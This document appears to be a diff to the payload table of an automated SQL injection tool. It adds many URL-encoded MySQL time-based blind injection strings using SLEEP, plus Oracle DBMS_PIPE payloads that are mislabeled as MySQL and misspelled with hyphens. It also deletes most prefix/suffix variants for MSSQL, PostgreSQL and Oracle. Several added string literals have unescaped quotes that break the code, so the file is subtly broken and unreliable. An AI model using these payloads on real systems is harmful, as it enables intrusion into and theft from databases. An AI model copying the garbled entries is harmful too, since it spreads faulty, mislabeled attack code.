+                "payload": "'XOR%20(%20%20((%20(%20if%20%20(%20%201%20=%20%201,%20sleep%20(%20((%20(%2010%20%20)%20)%20)),%200%20)%20)%20)%20)%20)XOR'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20or%20if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20)--%20-",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "0\"XOR(if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20))XOR"Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'XOR(if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20))XOR'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"XOR(if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20))XOR"",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'||DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)||'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"||DBMS-PIPE.RECEIVEMESSAGE('IsjT',10)||"",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20AND%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%2086105=DBMS-PIPE.RECEIVEMESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ")%20AND%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ")%20OR%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "')%20AND%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)-",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "')%20OR%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\")%20AND%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\")%20OR%2086105=DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
         ],
@@ -1158,28 +6118,9 @@ PAYLOADS = {
             {
                 "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
                 "comments": [
-                    {"pref": ";", "suf": ""},
-                    {"pref": "';", "suf": ""},
-                    {"pref": '";', "suf": ""},
-                    {"pref": ");", "suf": ""},
-                    {"pref": "');", "suf": ""},
-                    {"pref": '");', "suf": ""},
+                    #{"pref": ";", "suf": ""},
                 ],
                 "title": "Microsoft SQL Server/Sybase stacked queries",
-                "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
-                "dbms": "Microsoft SQL Server",
-            },
-            {
-                "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
-                "comments": [
-                    {"pref": ";", "suf": "--"},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
-                ],
-                "title": "Microsoft SQL Server/Sybase stacked queries (comment)",
                 "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                 "dbms": "Microsoft SQL Server",
             },
@@ -1188,28 +6129,9 @@ PAYLOADS = {
             {
                 "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
                 "comments": [
-                    {"pref": " ", "suf": "--"},
-                    {"pref": "' ", "suf": "--"},
-                    {"pref": '" ', "suf": "--"},
-                    {"pref": ") ", "suf": "--"},
-                    {"pref": "') ", "suf": "--"},
-                    {"pref": '") ', "suf": "--"},
+                    #{"pref": " ", "suf": "--"},
                 ],
                 "title": "Microsoft SQL Server/Sybase time-based blind (IF)",
-                "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
-                "dbms": "Microsoft SQL Server",
-            },
-            {
-                "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
-                "comments": [
-                    {"pref": " ", "suf": "--"},
-                    {"pref": "' ", "suf": "--"},
-                    {"pref": '" ', "suf": "--"},
-                    {"pref": ") ", "suf": "--"},
-                    {"pref": "') ", "suf": "--"},
-                    {"pref": '") ', "suf": "--"},
-                ],
-                "title": "Microsoft SQL Server/Sybase time-based blind (IF - comment)",
                 "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                 "dbms": "Microsoft SQL Server",
             },
@@ -1505,29 +6427,10 @@ PAYLOADS = {
             {
                 "payload": "(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
                 "comments": [
-                    {"pref": ";", "suf": ""},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
+                    #{"pref": ";", "suf": ""},
                 ],
                 "title": "PostgreSQL > 8.1 stacked queries",
                 "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
-                "dbms": "PostgreSQL",
-            },
-            {
-                "payload": "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",
-                "comments": [
-                    {"pref": ";", "suf": ""},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
-                ],
-                "title": "PostgreSQL stacked queries (heavy query)",
-                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1234 END))",
                 "dbms": "PostgreSQL",
             },
         ],
@@ -1535,45 +6438,13 @@ PAYLOADS = {
             {
                 "payload": "AND 4564=(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
                 "comments": [
-                    {"pref": " ", "suf": ""},
-                    {"pref": " ", "suf": "--"},
-                    {"pref": "' ", "suf": ""},
-                    {"pref": "' ", "suf": "--"},
-                    {"pref": '" ', "suf": ""},
-                    {"pref": '" ', "suf": "--"},
-                    {"pref": ") ", "suf": ""},
-                    {"pref": ") ", "suf": "--"},
-                    {"pref": "') ", "suf": ""},
-                    {"pref": "') ", "suf": "--"},
-                    {"pref": '") ', "suf": ""},
-                    {"pref": '") ', "suf": "--"},
+                    #{"pref": " ", "suf": ""},
                 ],
                 "title": "PostgreSQL > 8.1 AND time-based blind (comment)",
                 "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
                 "dbms": "PostgreSQL",
             },
-            {
-                "payload": "OR 9756=(SELECT 9756 FROM PG_SLEEP([SLEEPTIME]))",
-                "comments": [
-                    {"pref": " ", "suf": ""},
-                    {"pref": " ", "suf": "--"},
-                    {"pref": "' ", "suf": ""},
-                    {"pref": "' ", "suf": "--"},
-                    {"pref": '" ', "suf": ""},
-                    {"pref": '" ', "suf": "--"},
-                    {"pref": ") ", "suf": ""},
-                    {"pref": ") ", "suf": "--"},
-                    {"pref": "') ", "suf": ""},
-                    {"pref": "') ", "suf": "--"},
-                    {"pref": '") ', "suf": ""},
-                    {"pref": '") ', "suf": "--"},
-                ],
-                "title": "PostgreSQL > 8.1 OR time-based blind (comment)",
-                "vector": "OR 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
-                "dbms": "PostgreSQL",
-            },
-            # "AND 4564=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",
-        ],
+		],
         "error-based": [
             {
                 "payload": "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
@@ -1662,43 +6533,10 @@ PAYLOADS = {
             {
                 "payload": "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) FROM DUAL)",
                 "comments": [
-                    {"pref": ";", "suf": ""},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
+                    #{"pref": ";", "suf": ""},
                 ],
                 "title": "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
                 "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) ELSE 5238 END)",
-                "dbms": "Oracle",
-            },
-            {
-                "payload": "BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END",
-                "comments": [
-                    {"pref": ";", "suf": ""},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
-                ],
-                "title": "Oracle stacked queries (DBMS_LOCK.SLEEP - comment)",
-                "vector": "BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END",
-                "dbms": "Oracle",
-            },
-            {
-                "payload": "BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END",
-                "comments": [
-                    {"pref": ";", "suf": ""},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
-                ],
-                "title": "Oracle stacked queries (USER_LOCK.SLEEP - comment)",
-                "vector": "BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END",
                 "dbms": "Oracle",
             },
         ],
@@ -1706,85 +6544,10 @@ PAYLOADS = {
             {
                 "payload": "DBMS_PIPE.RECEIVE_MESSAGE('IsjT',[SLEEPTIME])",
                 "comments": [
-                    {"pref": "", "suf": ""},
-                    {"pref": " AND 8675=", "suf": ""},
-                    {"pref": " OR 8675=", "suf": ""},
-                    {"pref": "' ", "suf": ""},
-                    {"pref": "'||", "suf": "||'"},
-                    {"pref": "' AND 8675=", "suf": "--"},
-                    {"pref": "' OR 8675=", "suf": "--"},
-                    # {"pref": '" ', "suf": ""},
-                    {"pref": '"||', "suf": '||"'},
-                    {"pref": '" AND 8675=', "suf": "--"},
-                    {"pref": '" OR 8675=', "suf": "--"},
-                    # {"pref": ") ", "suf": ""},
-                    {"pref": ") AND 8675=", "suf": "--"},
-                    {"pref": ") OR 8675=", "suf": "--"},
-                    # {"pref": "') ", "suf": ""},
-                    {"pref": "') AND 8675=", "suf": "--"},
-                    {"pref": "') OR 8675=", "suf": "--"},
-                    # {"pref": '") ', "suf": ""},
-                    {"pref": '") AND 8675=', "suf": "--"},
-                    {"pref": '") OR 8675=', "suf": "--"},
+                    #{"pref": "", "suf": ""},
                 ],
                 "title": "Oracle time-based blind (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
                 "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('IkdY',[SLEEPTIME]) ELSE 5689 END)",
-                "dbms": "Oracle",
-            },
-            {
-                "payload": "DBMS_LOCK.SLEEP([SLEEPTIME])",
-                "comments": [
-                    {"pref": "", "suf": ""},
-                    {"pref": " AND 8675=", "suf": ""},
-                    {"pref": " OR 8675=", "suf": ""},
-                    {"pref": "' ", "suf": ""},
-                    {"pref": "'||", "suf": "||'"},
-                    {"pref": "' AND 8675=", "suf": "--"},
-                    {"pref": "' OR 8675=", "suf": "--"},
-                    # {"pref": '" ', "suf": ""},
-                    {"pref": '"||', "suf": '||"'},
-                    {"pref": '" AND 8675=', "suf": "--"},
-                    {"pref": '" OR 8675=', "suf": "--"},
-                    # {"pref": ") ", "suf": ""},
-                    {"pref": ") AND 8675=", "suf": "--"},
-                    {"pref": ") OR 8675=", "suf": "--"},
-                    # {"pref": "') ", "suf": ""},
-                    {"pref": "') AND 8675=", "suf": "--"},
-                    {"pref": "') OR 8675=", "suf": "--"},
-                    # {"pref": '") ', "suf": ""},
-                    {"pref": '") AND 8675=', "suf": "--"},
-                    {"pref": '") OR 8675=', "suf": "--"},
-                ],
-                "title": "Oracle time-based blind (DBMS_LOCK.SLEEP - comment)",
-                "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]) ELSE DBMS_LOCK.SLEEP(0) END)",
-                "dbms": "Oracle",
-            },
-            {
-                "payload": "USER_LOCK.SLEEP([SLEEPTIME])",
-                "comments": [
-                    {"pref": "", "suf": ""},
-                    {"pref": " AND 8675=", "suf": ""},
-                    {"pref": " OR 8675=", "suf": ""},
-                    {"pref": "' ", "suf": ""},
-                    {"pref": "'||", "suf": "||'"},
-                    {"pref": "' AND 8675=", "suf": "--"},
-                    {"pref": "' OR 8675=", "suf": "--"},
-                    # {"pref": '" ', "suf": ""},
-                    {"pref": '"||', "suf": '||"'},
-                    {"pref": '" AND 8675=', "suf": "--"},
-                    {"pref": '" OR 8675=', "suf": "--"},
-                    # {"pref": ") ", "suf": ""},
-                    {"pref": ") AND 8675=", "suf": "--"},
-                    {"pref": ") OR 8675=", "suf": "--"},
-                    # {"pref": "') ", "suf": ""},
-                    {"pref": "') AND 8675=", "suf": "--"},
-                    {"pref": "') OR 8675=", "suf": "--"},
-                    # {"pref": '") ', "suf": ""},
-                    {"pref": '") AND 8675=', "suf": "--"},
-                    {"pref": '") OR 8675=', "suf": "--"},
-                ],
-                "title": "Oracle time-based blind (USER_LOCK.SLEEP - comment)",
-                "vector": "(CASE WHEN ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]) ELSE USER_LOCK.SLEEP(0) END)",
                 "dbms": "Oracle",
             },
         ],
